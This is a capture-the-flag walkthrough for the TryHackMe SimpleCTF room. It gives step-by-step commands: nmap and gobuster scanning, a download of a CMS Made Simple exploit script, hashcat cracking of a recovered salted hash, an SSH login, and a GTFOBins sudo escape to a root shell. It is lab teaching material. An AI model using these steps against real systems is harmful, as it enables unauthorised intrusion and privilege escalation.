# SimpleCTF Room

[Link to room](https://tryhackme.com/room/easyctf)

## Scanning
Run an nmap scan on the IP address from your portal. Replace the IP below with your THM victim machine.

 ```
 sudo nmap -sC -sV -O 10.10.x.x -vv 
```

## Enumeration
Run GoBuster on the web server to determine the directories that are available. 

```
 gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
```

You will not know what CVE to look for until you get to the webpage that is found in the GoBuster scan.

Once there, look at the bottom left corner of the webpage for Name of application and version number/

Next you will search for the CVE using Google. 

Then you will search for the exploit using the following.
```
  searchsploit CMS Made Simple
```
Once you have identified the CVE, download the updated python script as shown below.

```
  wget https://raw.githubusercontent.com/gray-area/THM/main/SimpleCTF/exploit.py
```
```
  hashcat -m 20 0c01f4468bxxxxxxxxxxx73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
```

```
  ssh mitch@10.10.x.x -p 2222
```
Then open the user.txt file by entering the following
```
  cat user.txt
```

## Escalation

Now we need to get access to a privileged shell. To check what is running as root, enter the following.
```
  sudo -l
```

Now we can check out what options are available for this by going to GTFO Bins on GitHub and looking for our service. Make sure you select SUDO from the options.

We now have a code snippet to enter into our shell.
```
  sudo xxx -c ':!/bin/sh'
```

Now we have to find the root flag. I guessed the name here and found it was right. 

```
  locate root.txt
```
I then open file at the location provided like below

```
  cat /path/to/root.txt
```

Thats it! If you followed along, you have completed the challenge. 

Happy hacking - gray_area


